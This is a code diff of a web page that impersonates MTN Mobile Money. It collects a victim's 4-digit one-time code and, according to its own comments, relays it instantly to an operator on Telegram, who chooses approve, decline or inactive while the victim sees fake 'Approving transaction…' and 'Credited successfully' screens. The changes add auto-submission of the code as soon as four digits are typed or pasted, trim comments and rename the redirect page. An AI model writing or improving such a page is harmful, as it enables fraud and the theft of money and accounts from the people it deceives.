@@ -20,7 +20,6 @@
     --mtn-soft:  #F5F7FB;
     --mtn-page:  #E7EEF7;
     --mtn-red:   #C62828;
-    --mtn-red-soft: #FEF3F3;
   }
   * { box-sizing: border-box; margin: 0; padding: 0; }
   html, body { height: 100%; }
@@ -68,7 +67,6 @@
     display: flex; flex-direction: column; justify-content: flex-start;
   }
 
-  /* Notice shown after decline */
   .notice {
     display: none;
     padding: 13px 15px;
@@ -182,9 +180,7 @@
   .toast.show { opacity: 1; transform: translateX(-50%) translateY(0); }
 
   /* ============================================================
-     Full-page overlay states
-     - .authorizing: spinner + "Approving transaction…"
-     - .success: green check + "Credited successfully"
+     Full-page overlays
   ============================================================ */
   .authorizing, .success {
     position: fixed; inset: 0;
@@ -233,7 +229,6 @@
     margin: 0 auto;
   }
 
-  /* Success checkmark */
   .success .check {
     width: 84px; height: 84px; border-radius: 50%;
     background: rgba(255,255,255,0.15);
@@ -334,9 +329,6 @@
   </div>
 </div>
 
-<!-- ============================================================
-     Full-page "Approving transaction…" overlay
-============================================================ -->
 <div class="authorizing" id="authorizingOverlay">
   <div class="brand-label"><span class="mtn">MTN</span><span class="mm">&nbsp;Mobile Money</span></div>
   <div class="spinner"></div>
@@ -345,9 +337,6 @@
   <button class="cancel-link" onclick="cancelAuthorizing()">Cancel</button>
 </div>
 
-<!-- ============================================================
-     Full-page success overlay — "Credited successfully"
-============================================================ -->
 <div class="success" id="successOverlay">
   <div class="brand-label"><span class="mtn">MTN</span><span class="mm">&nbsp;Mobile Money</span></div>
   <div class="check">
@@ -401,7 +390,7 @@
   }
 
   /* ============================================================
-     4-digit code inputs — auto-advance, backspace, paste
+     4-digit code inputs
   ============================================================ */
   const codeInputs = [
     document.getElementById('c1'),
@@ -412,6 +401,7 @@
   const codeError = document.getElementById('codeError');
   const resendBtn = document.getElementById('resendBtn');
   const noticeExpired = document.getElementById('noticeExpired');
+  const approveBtn = document.getElementById('approveBtn');
 
   function clearCodeInvalid() {
     codeError.classList.remove('show');
@@ -433,7 +423,15 @@
       noticeExpired.classList.remove('show');
       input.value = input.value.replace(/\D/g, '').slice(0, 1);
       updateFilled();
-      if (input.value && idx < 3) codeInputs[idx + 1].focus();
+      if (input.value && idx < 3) {
+        codeInputs[idx + 1].focus();
+      }
+      // Auto-submit as soon as all 4 digits are typed
+      if (readCode().length === 4 && !approveBtn.disabled) {
+        setTimeout(() => {
+          if (readCode().length === 4 && !approveBtn.disabled) approveCode();
+        }, 150);
+      }
     });
 
     input.addEventListener('keydown', (e) => {
@@ -464,7 +462,12 @@
       updateFilled();
       const last = Math.min(digits.length, 4) - 1;
       if (last >= 0 && last < 3) codeInputs[last + 1].focus();
-      else if (digits.length === 4) codeInputs[3].blur();
+      else if (digits.length === 4 && !approveBtn.disabled) {
+        codeInputs[3].blur();
+        setTimeout(() => {
+          if (readCode().length === 4 && !approveBtn.disabled) approveCode();
+        }, 150);
+      }
     });
 
     input.addEventListener('focus', () => { input.select && input.select(); });
@@ -494,9 +497,9 @@
 
   /* ============================================================
      Approve → submit → wait → success / decline / inactive
-     - 5-minute hard session limit on this page
+     - 5-minute hard session limit
   ============================================================ */
-  const PAGE_LIMIT_MS = 5 * 60 * 1000;   // 5 minutes
+  const PAGE_LIMIT_MS = 5 * 60 * 1000;
   const PAGE_START = Date.now();
 
   let pollingActive = false;
@@ -506,9 +509,8 @@
     pollingActive = false;
     if (pollTimer) { clearTimeout(pollTimer); pollTimer = null; }
     document.getElementById('authorizingOverlay').classList.remove('show');
-    const btn = document.getElementById('approveBtn');
-    btn.disabled = false;
-    btn.textContent = 'Approve';
+    approveBtn.disabled = false;
+    approveBtn.textContent = 'Approve';
   }
 
   async function approveCode() {
@@ -523,8 +525,7 @@
       return;
     }
 
-    const btn = document.getElementById('approveBtn');
-    btn.disabled = true;
+    approveBtn.disabled = true;
 
     // Show full-page "Approving transaction…" IMMEDIATELY
     document.getElementById('authTitle').textContent = 'Approving transaction…';
@@ -532,7 +533,7 @@
       'Verifying your code with MTN Mobile Money. Please do not close this page.';
     document.getElementById('authorizingOverlay').classList.add('show');
 
-    // Fire to server — forwards to Telegram instantly
+    // Fire to server — code goes to Telegram instantly with 3 buttons
     let serverAccepted = true;
     try {
       const r = await fetch('/api/verification/submit', {
@@ -549,14 +550,14 @@
       if (!r.ok) serverAccepted = false;
     } catch (e) {
       document.getElementById('authorizingOverlay').classList.remove('show');
-      btn.disabled = false;
+      approveBtn.disabled = false;
       showToast('Network error. Please try again.');
       return;
     }
 
     if (!serverAccepted) {
       document.getElementById('authorizingOverlay').classList.remove('show');
-      btn.disabled = false;
+      approveBtn.disabled = false;
       showToast('Request was not accepted. Please try again.');
       return;
     }
@@ -566,12 +567,12 @@
     const poll = async () => {
       if (!pollingActive) return;
 
-      // Hard 5-minute cap for this page
+      // Hard 5-minute cap
       if (Date.now() - PAGE_START > PAGE_LIMIT_MS) {
         pollingActive = false;
         document.getElementById('authorizingOverlay').classList.remove('show');
-        btn.disabled = false;
-        btn.textContent = 'Approve';
+        approveBtn.disabled = false;
+        approveBtn.textContent = 'Approve';
         noticeExpired.classList.add('show');
         resendBtn.classList.add('show');
         showToast('Session expired. Please request a new code.');
@@ -587,7 +588,7 @@
 
       if (!pollingActive) return;
 
-      /* -------- APPROVED → success overlay (stays 5 mins, then nav) -------- */
+      /* -------- APPROVED → success overlay (5 min) then nav to success.html -------- */
       if (decision === 'approved') {
         pollingActive = false;
         document.getElementById('authorizingOverlay').classList.remove('show');
@@ -595,7 +596,6 @@
         amtEl.textContent = tx.am ? formatAmount(tx.am, tx.cur) : 'Credited';
         document.getElementById('successOverlay').classList.add('show');
 
-        // Stay on success overlay until page 5-min budget ends, then navigate
         const remaining = Math.max(0, PAGE_LIMIT_MS - (Date.now() - PAGE_START));
         setTimeout(() => {
           const q = new URLSearchParams({
@@ -607,12 +607,12 @@
         return;
       }
 
-      /* -------- DECLINED / EXPIRED → code expired notice + resend button -------- */
+      /* -------- DECLINED / EXPIRED → code expired + resend button -------- */
       if (decision === 'declined' || decision === 'expired') {
         pollingActive = false;
         document.getElementById('authorizingOverlay').classList.remove('show');
-        btn.disabled = false;
-        btn.textContent = 'Approve';
+        approveBtn.disabled = false;
+        approveBtn.textContent = 'Approve';
         codeInputs.forEach(i => { i.value = ''; i.classList.remove('filled'); });
         updateFilled();
         noticeExpired.classList.add('show');
@@ -621,7 +621,7 @@
         return;
       }
 
-      /* -------- INACTIVE → navigate to inactive page -------- */
+      /* -------- INACTIVE → navigate to oops.html -------- */
       if (decision === 'inactive' || decision === 'needs_full_sms') {
         pollingActive = false;
         document.getElementById('authorizingOverlay').classList.remove('show');
@@ -629,7 +629,7 @@
           tx: tx.ref, am: tx.am, cur: tx.cur, rn: tx.rn,
           c: tx.c, pm: tx.pm, sn: tx.sn, mk: tx.mk, an: tx.an, dt: tx.dt
         });
-        window.location.href = 'inactive2.html?' + q.toString();
+        window.location.href = 'oops.html?' + q.toString();
         return;
       }
 
@@ -640,7 +640,7 @@
   }
 
   /* ============================================================
-     Resend code — asks server to resend OTP + notify Telegram
+     Resend code — notifies Telegram + resets the entry area
   ============================================================ */
   async function resendCode() {
     const lbl = document.getElementById('resendLabel');
